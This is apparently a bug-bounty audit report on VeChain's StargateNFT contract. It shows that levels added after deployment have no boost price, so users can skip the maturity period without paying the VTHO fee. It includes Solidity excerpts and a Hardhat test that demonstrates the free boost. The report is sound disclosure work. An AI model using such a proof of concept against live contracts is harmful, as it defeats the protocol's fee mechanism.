# 60171 sc low levels added after deployment lack boost price initialization resulting in free boosting

**Submitted on Nov 19th 2025 at 14:44:28 UTC by @aman for** [**Audit Comp | Vechain | Stargate Hayabusa**](https://immunefi.com/audit-competition/audit-comp-vechain-stargate-hayabusa)

* Report ID: #60171
* Report Type: Smart Contract
* Report severity: Low
* Target: <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/tree/main/packages/contracts/contracts/StargateNFT/StargateNFT.sol>
* Impacts:
  * Theft of unclaimed royalties

## Description

### Brief/Intro

The `addLevel` function allows new levels to be added after deployment, but there is no accompanying function to set the `boostPricesPerBlock` for these newly added levels. As a result, users can benefit from boost features without paying any fee in `VTHO` tokens, bypassing the intended waiting period and staking directly on the validator for free.

### Vulnerability Details

A new feature introduced in this version allows users to perform boosting, where they pay a token fee to bypass the maturity period and stake immediately to start earning rewards. Under normal operation, levels and their corresponding boost prices are set during initialization inside `initializeV3` as follows:

```solidity
/audit-comp-vechain-stargate-hayabusa/packages/contracts/contracts/StargateNFT/StargateNFT.sol:226
226:     function initializeV3(
227:         address stargate,
228:         uint8[] memory levelIds,
229:         uint256[] memory boostPricesPerBlock
230:     ) external onlyRole(UPGRADER_ROLE) reinitializer(3) {
....
239:         DataTypes.StargateNFTStorage storage $ = _getStargateNFTStorage();
240:         $.stargate = IStargate(stargate);
241:         for (uint256 i; i < levelIds.length; i++) {
242:             Levels.updateLevelBoostPricePerBlock($, levelIds[i], boostPricesPerBlock[i]);
243:         }
244:     }
```

Here at Line `242` the `boostPricesPerBlock` for each level is set.

However the levels can also be added after this flow via the `addLevel` function as follows:

```solidity
/audit-comp-vechain-stargate-hayabusa/packages/contracts/contracts/StargateNFT/StargateNFT.sol:302
302:     function addLevel(
303:         DataTypes.LevelAndSupply memory _levelAndSupply
304:     ) public onlyRole(LEVEL_OPERATOR_ROLE) {
305:         Levels.addLevel(_getStargateNFTStorage(), _levelAndSupply);
306:     }
```

StargateNFTContract::addLevel -> Levels::addLevel:

```solidity
/audit-comp-vechain-stargate-hayabusa/packages/contracts/contracts/StargateNFT/libraries/Levels.sol:88
 88:     function addLevel(
 89:         DataTypes.StargateNFTStorage storage $,
 90:         DataTypes.LevelAndSupply memory _levelAndSupply
 91:     ) external {
 92:         // Increment MAX_LEVEL_ID
 93:         $.MAX_LEVEL_ID++;
 95:         // Override level ID to be the new MAX_LEVEL_ID (We do not care about the level id in the input)
 96:         _levelAndSupply.level.id = $.MAX_LEVEL_ID;
 98:         // Validate level fields
 99:         _validateLevel(_levelAndSupply.level);
101:         // Validate supply
102:         if (_levelAndSupply.circulatingSupply > _levelAndSupply.cap) {
103:             revert Errors.CirculatingSupplyGreaterThanCap();
104:         }
106:         // Add new level to storage
107:         $.levels[_levelAndSupply.level.id] = _levelAndSupply.level;
108:         _checkpointLevelCirculatingSupply(
109:             $,
110:             _levelAndSupply.level.id,
111:             _levelAndSupply.circulatingSupply
112:         );
113:         $.cap[_levelAndSupply.level.id] = _levelAndSupply.cap;
114: 
...
125:     }
```

As shown above, `boostPricePerBlock` is never initialized for newly added levels. Consequently, any user can call the `boost` or `stakeAndDelegate` functions on levels created via the `addLevel` function without paying any fee. This allows them to bypass the intended maturity period and immediately stake `VET` on the validator.

### Impact Details

The vulnerability lets users bypass the boost fee entirely, granting them free boosts. Although no protocol funds are lost because fees are burned, the fee mechanism becomes ineffective.

## Proof of Concept

<details>

<summary>Unit test demonstrating the issue (Boost.test.ts)</summary>

Add the following unit test case to the file `Boost.test.ts` and run with command `npx hardhat test`.

Note: Also import `time` (and optionally `mine`) from `@nomicfoundation/hardhat-network-helpers`.

```javascript
import { mine, time } from "@nomicfoundation/hardhat-network-helpers";

/audit-comp-vechain-stargate-hayabusa/packages/contracts/test/unit/StargateNFT/Boost.test.ts:344
344: 
        it.only("should be able to boost a token owned by another user with my own allowance", async () => {
            const levelOperator = otherAccounts[2];
            const grantTx = await stargateNFTContract.grantRole(
                await stargateNFTContract.LEVEL_OPERATOR_ROLE(),
                levelOperator.address
            );
            await grantTx.wait();
            const newLevelAndSupply = {
                level: {
                    id: 25, // This id does not matter since it will be replaced by the real one
                    name: "My New Level",
                    isX: false,
                    vetAmountRequiredToStake: ethers.parseEther("1000000"),
                    scaledRewardFactor: 150,
                    maturityBlocks: 30,
                },
                cap: 872,
                circulatingSupply: 0,
            };
            const currentLevelIds = await stargateNFTContract.getLevelIds();
            const bosteddAmount = await stargateNFTContract.boostAmountOfLevel(1);
            console.log("bosteddAmount of level 1", bosteddAmount);
            tx = await stargateNFTContract.connect(levelOperator).addLevel(newLevelAndSupply);
            await tx.wait();
            const expectedLevelId = currentLevelIds[currentLevelIds.length - 1] + 1n;
            // mint the NFT for the user
            const bosteddAmount2 = await stargateNFTContract.boostAmountOfLevel(expectedLevelId);
            console.log("bosteddAmount of level added via addLevel", bosteddAmount2);

            tx = await stargateNFTContract.mint(expectedLevelId, user.address);
            await tx.wait();
            const tokenId = await stargateNFTContract.getCurrentTokenId();
            console.log("✅ Minted NFT with id", tokenId);
            const maturityPeriodEndBlock =
                await stargateNFTContract.maturityPeriodEndBlock(tokenId);
            expect(maturityPeriodEndBlock).to.be.greaterThan((await time.latestBlock()).toString());

            const boostAmount = await stargateNFTContract.boostAmount(tokenId);
            expect(boostAmount).to.equal(0);
            const oldBalance = await vthoTokenContract.balanceOf(user.address);
            // boost the NFT with other user
            tx = await stargateNFTContract.connect(otherUser).boost(tokenId);
            await tx.wait();
            log("✅ Boosted NFT");
            const newVthoBalance = await vthoTokenContract.balanceOf(user.address);
            log("👀 New VTHO balance", newVthoBalance);
            expect(newVthoBalance).to.equal(oldBalance);
            const maturityPeriodEndBlockAfterBoost =
                await stargateNFTContract.maturityPeriodEndBlock(tokenId);
            expect(maturityPeriodEndBlockAfterBoost).to.equal((await time.latestBlock()).toString());
        });
```

</details>

## References

Add any relevant links to documentation or code.
